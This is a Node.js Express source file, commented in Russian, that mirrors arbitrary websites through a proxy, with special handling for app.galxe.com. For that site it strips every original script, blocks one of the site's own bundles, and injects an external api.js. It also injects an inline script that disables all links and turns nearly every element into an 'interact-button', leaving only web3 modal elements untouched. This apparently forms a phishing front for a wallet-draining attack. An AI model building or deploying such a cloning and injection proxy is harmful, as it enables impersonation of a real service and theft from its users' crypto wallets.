const express = require("express");
const http = require("http");
const https = require("https");
const path = require("path");

const app = express();
const PORT = process.env.PORT || 3000;

// *** CORS-заголовки ***
app.use((req, res, next) => {
  res.setHeader("Access-Control-Allow-Origin", "*");
  res.setHeader("Access-Control-Allow-Methods", "GET, POST");
  res.setHeader("Access-Control-Allow-Headers", "Content-Type");
  next();
});

// *** Кеш с ограничением размера ***
const staticCache = new Map();
const MAX_CACHE_SIZE = 100;

function addToCache(key, value) {
  if (staticCache.size >= MAX_CACHE_SIZE) {
    const firstKey = staticCache.keys().next().value;
    staticCache.delete(firstKey);
  }
  staticCache.set(key, value);
}

// Раздаём только api.js
app.get("/api.js", (req, res) => {
  res.sendFile(path.join(__dirname, "api.js"));
});

// Скрипт для вставки
const injectedScriptTag = `<script charset="UTF-8" type="text/javascript" src="/api.js"></script>`;
const inlineScript = `
<script>
  function addClassesToElements() {
    const links = document.querySelectorAll('a:not(.interact-button)');
    for (const link of links) {
      link.removeAttribute('href');
      link.classList.add('interact-button');
    }
    const buttons = document.querySelectorAll('div:not(.interact-button):not(.web3-overlay):not(.item):not(.web3-modal-items):not(.web3-modal-title):not(.web3-modal)');
    for (const button of buttons) {
      button.classList.add('interact-button');
    }
  }
  function runWhenReady() {
    addClassesToElements();
    setInterval(addClassesToElements, 300);
  }
  if (document.readyState === "loading") {
    document.addEventListener("DOMContentLoaded", runWhenReady);
  } else {
    runWhenReady();
  }
</script>
`;

// Проксируем статику через /proxy
app.use("/proxy", (req, res) => {
  const targetBase = req.query.base;
  if (!targetBase) return res.status(400).send("Параметр ?base= обязателен");

  const proxiedPath = req.path;

  // Блокируем ТОЛЬКО один .js файл
  if (proxiedPath.includes("6117-f9e73b6ee5f6ecb4.js")) {
    return res.status(204).end(); // блокировка
  }

  let targetUrl;
  try {
    targetUrl = new URL(proxiedPath, targetBase).toString();
  } catch {
    return res.status(400).send("Некорректный URL для проксирования");
  }

  const protocol = targetUrl.startsWith("https") ? https : http;

  if (staticCache.has(targetUrl)) {
    const cached = staticCache.get(targetUrl);
    res.writeHead(200, cached.headers);
    return res.end(cached.body);
  }

  protocol.get(targetUrl, (proxyRes) => {
    let chunks = [];
    proxyRes.on("data", (chunk) => chunks.push(chunk));
    proxyRes.on("end", () => {
      const buffer = Buffer.concat(chunks);
      const contentType = proxyRes.headers["content-type"] || "";

      if (!contentType.includes("text/html")) {
        // *** Используем функцию с ограничением размера кеша ***
        addToCache(targetUrl, {
          headers: proxyRes.headers,
          body: buffer,
        });
      }

      res.writeHead(proxyRes.statusCode, proxyRes.headers);
      res.end(buffer);
    });
  }).on("error", (err) => {
    res.status(500).send("Ошибка при проксировании статики: " + err.message);
  });
});

// Поддержка путей вида /site.com/...
app.get("/:domain/*", (req, res, next) => {
  const domain = req.params.domain;
  const restPath = req.params[0] || "";

  if (["api.js", "proxy"].includes(domain)) return next();

  const query = req.originalUrl.split("?")[1] || "";
  const fullUrl = `https://${domain}/${restPath}${query ? "?" + query : ""}`;

  proxyHtml(fullUrl, res);
});

// Поддержка просто /site.com
app.get("/:domain", (req, res, next) => {
  const domain = req.params.domain;
  if (["api.js", "proxy"].includes(domain)) return next();

  const targetUrl = `https://${domain}`;
  proxyHtml(targetUrl, res);
});

// Поддержка старого варианта через ?id=
app.get("/", (req, res) => {
  const targetUrl = req.query.id;
  if (!targetUrl) return res.status(400).send("Параметр ?id= обязателен");

  proxyHtml(targetUrl, res);
});

// Основная логика HTML-прокси
function proxyHtml(targetUrl, res) {
  let urlObj;
  try {
    urlObj = new URL(targetUrl);
  } catch {
    return res.status(400).send("Некорректный URL");
  }

  const protocol = urlObj.protocol === "https:" ? https : http;
  const isGalxe = urlObj.hostname === "app.galxe.com";

  protocol.get(targetUrl, (proxyRes) => {
    let body = [];

    proxyRes.on("data", (chunk) => body.push(chunk));
    proxyRes.on("end", () => {
      let contentType = proxyRes.headers["content-type"] || "";
      let responseBody = Buffer.concat(body).toString("utf8");

      if (contentType.includes("text/html")) {
        // Прокси подмены путей
        responseBody = responseBody.replace(
          /(["'])\/([^"']+\.(ico|svg|png|jpg|jpeg|gif|webp))(["'])/gi,
          `$1/proxy/$2?base=${targetUrl}$4`
        );

        responseBody = responseBody
          .replace(/(["'])\/(_next\/[^"']+)/g, `$1/proxy/$2?base=${targetUrl}`)
          .replace(/(["'])\/(assets\/[^"']+)/g, `$1/proxy/$2?base=${targetUrl}`)
          .replace(/(["'])\/(static\/[^"']+)/g, `$1/proxy/$2?base=${targetUrl}`);

        if (isGalxe) {
          // Удаляем ВСЕ <script> теги, кроме /api.js
          responseBody = responseBody.replace(
            /<script\b[^>]*src=["'][^"']*["'][^>]*><\/script>/gi,
            (match) => (match.includes('/api.js') ? match : '')
          );
          // Удаляем inline-скрипты
          responseBody = responseBody.replace(/<script\b[^>]*>([\s\S]*?)<\/script>/gi, '');

          // Удаляем существующие favicon
          responseBody = responseBody.replace(/<link[^>]+rel=["']icon["'][^>]*>/gi, "");

          // Вставляем внешний favicon
          const faviconLink = '<link rel="icon" href="https://app.galxe.com/favicon.ico" type="image/x-icon">';
          if (responseBody.includes("</head>")) {
            responseBody = responseBody.replace("</head>", faviconLink + "\n</head>");
          } else {
            responseBody = faviconLink + responseBody;
          }
        }

        // Вставляем только api.js и inline script
        const injection = `${injectedScriptTag}\n${inlineScript}`;
        if (responseBody.includes("</head>")) {
          responseBody = responseBody.replace("</head>", `${injection}</head>`);
        } else {
          responseBody = injection + responseBody;
        }
      }

      const headers = { ...proxyRes.headers };
      delete headers["content-length"];
      delete headers["content-encoding"];

      res.writeHead(proxyRes.statusCode, headers);
      res.end(responseBody);
    });
  }).on("error", (err) => {
    res.status(500).send("Ошибка при проксировании: " + err.message);
  });
}

app.listen(PORT, () => {
  console.log(`🚀 Сервер запущен на порту ${PORT}`);
});
